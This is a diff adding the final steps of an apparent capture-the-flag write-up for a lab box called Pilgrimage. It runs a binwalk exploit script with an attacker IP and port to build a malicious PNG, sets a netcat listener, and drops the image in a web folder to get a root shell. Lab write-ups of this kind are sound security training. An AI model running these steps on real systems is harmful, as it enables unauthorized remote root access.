@@ -459,11 +459,25 @@ so, we'll be needing a png file. I'll be transferring one from my machine to the
 
 Now, lets run the script again providing the necessary arguments
 
-command:```
+command:```python3 exploit.py hehe.png 10.10.14.215 443```
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/764a0249-f6f2-443f-86af-abf9c314c460)
 
+cool, now we can copy the ```binwalk_exploit.png``` image to the shrunk folder. 
 
+Ensure you set your netcat listener before copying the image to the shrunk folder
 
+command:```cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9b41985b-818d-4e7c-a85b-6358d036d20d)
+
+We spawned a root shell
+
+Box pwned successfully😎
+
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
 
 
 
